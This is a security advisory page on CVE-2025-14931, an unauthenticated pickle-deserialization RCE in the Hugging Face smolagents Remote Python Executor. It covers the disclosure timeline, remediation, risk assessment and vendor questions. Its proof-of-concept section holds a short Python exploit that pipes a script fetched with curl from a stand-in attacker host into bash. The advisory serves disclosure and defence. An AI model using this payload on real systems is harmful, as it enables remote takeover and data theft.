# CVE-2025-14931: Hugging Face smolagents Remote Code Execution (CVSS 10.0)

## Quick Reference

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-14931 |
| **Framework** | Hugging Face smolagents |
| **Affected Versions** | All versions (as of disclosure) |
| **Fixed Version** | Pending |
| **CVSS Score** | 10.0 (Critical) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Attack Vector** | Network (no authentication required) |
| **Disclosed** | 2025-12-12 (0-day) |

## Summary

A perfect CVSS 10.0 vulnerability in Hugging Face's smolagents library allows **unauthenticated remote code execution** through the Remote Python Executor component. The flaw exists in pickle data parsing, where user-supplied data is deserialized without validation. This was disclosed as a 0-day after the vendor rejected the initial report.

**This is as bad as it gets.** No authentication, network-accessible, trivial to exploit.

## Technical Details

**Vulnerable Component:** Remote Python Executor in smolagents

**Root Cause:** The Remote Python Executor parses pickle data from incoming requests without proper validation. Since pickle can execute arbitrary Python code during deserialization, any attacker who can send data to the executor can achieve code execution.

**Attack Pattern:**
1. Attacker identifies a smolagents deployment with Remote Python Executor enabled
2. Attacker sends a crafted pickle payload to the executor endpoint
3. No authentication is required
4. Server deserializes the payload using `pickle.load()`
5. Arbitrary code executes in the context of the service account

**Why CVSS 10.0:**
- Attack Vector: Network (remotely exploitable)
- Attack Complexity: Low (trivial to exploit)
- Privileges Required: None (unauthenticated)
- User Interaction: None
- Impact: Complete compromise (confidentiality, integrity, availability)

## Proof of Concept

The attack is straightforward pickle deserialization:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# Send this payload to the smolagents Remote Python Executor
payload = pickle.dumps(Exploit())
# RCE occurs when the server deserializes
```

## Remediation

### Immediate Actions

1. **Disable Remote Python Executor** if not strictly required

2. **Network isolation** - Remove any internet exposure of smolagents endpoints immediately

3. **Firewall rules** - Restrict access to trusted clients only

4. **Monitor for patches** - Check Hugging Face security advisories

### No Patch Available (as of disclosure)

This was disclosed as a 0-day. The disclosure timeline:
- 2025-12-09: ZDI submitted report to bug bounty program
- 2025-12-10: Report rejected as "out of scope"
- 2025-12-11: Vendor closed as duplicate
- 2025-12-12: ZDI published as 0-day advisory

**Until patched, assume all smolagents deployments with Remote Python Executor are compromised if network-accessible.**

## GRC Implications

### Risk Assessment

**Risk Level:** CRITICAL - Maximum possible severity

**Impact Scenarios:**
- Any internet-exposed smolagents deployment is immediately compromisable
- AI agent infrastructure becomes attacker-controlled
- Lateral movement into connected systems
- Data exfiltration from AI workloads
- Supply chain attacks through compromised AI agents

### Vendor Assessment Questions

If evaluating vendors using Hugging Face smolagents:

1. "Do you use Hugging Face smolagents in your AI infrastructure?"
2. "Is the Remote Python Executor component enabled?"
3. "Is the smolagents endpoint exposed to any untrusted network?"
4. "Are you aware of CVE-2025-14931 and its 0-day status?"
5. "What compensating controls exist until a patch is available?"

### Unique Risk: AI Agent Infrastructure

smolagents is used to build AI agents - autonomous systems that take actions. A compromised agent infrastructure means:
- Attackers can make the AI agent perform malicious actions
- Trust in AI agent outputs is completely undermined
- Actions taken by compromised agents may be difficult to distinguish from legitimate ones

### Control Recommendations

| Control | Description | Priority |
|---------|-------------|----------|
| Disable Remote Executor | Remove attack surface entirely | Critical |
| Network isolation | No internet exposure | Critical |
| Strict allowlisting | Only known clients can connect | Critical |
| Monitoring | Alert on any executor access | High |
| Incident response | Assume breach if exposed | High |

### Policy Implications

This CVE demonstrates that even major AI/ML vendors ship critical vulnerabilities. Consider adding to security policies:

- "AI agent frameworks must undergo security review before deployment"
- "Remote execution components in AI frameworks must never be internet-accessible"
- "0-day vulnerabilities in AI infrastructure require immediate isolation, not just monitoring"

## References

- [CVE Details](https://www.cvedetails.com/cve/CVE-2025-14931/)
- [GitHub Advisory GHSA-q9r5-6hrr-9ph7](https://github.com/advisories/GHSA-q9r5-6hrr-9ph7)
- [Zero Day Initiative ZDI-25-1143](https://www.zerodayinitiative.com/advisories/ZDI-25-1143/)
- [TheHackerWire Analysis](https://www.thehackerwire.com/critical-deserialization-flaw-exposes-hugging-face-smolagents-to-unauthenticated-rce-cve-2025-14931/)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-14931)

## Timeline

| Date | Event |
|------|-------|
| 2025-12-09 | ZDI submitted report |
| 2025-12-10 | Bug bounty rejected as out of scope |
| 2025-12-11 | Vendor closed as duplicate |
| 2025-12-12 | ZDI published 0-day advisory |
| TBD | Patch pending |

## Related Vulnerabilities

- [CVE-2023-6730](CVE-2023-6730.md) - Hugging Face Transformers RagRetriever
- Other Hugging Face Transformers pickle CVEs (CVE-2025-14920 through 14930)

---

*Last updated: 2026-01-18*

*Tags: `huggingface` `smolagents` `critical` `cvss-10` `0-day` `rce` `no-auth` `ai-agents`*
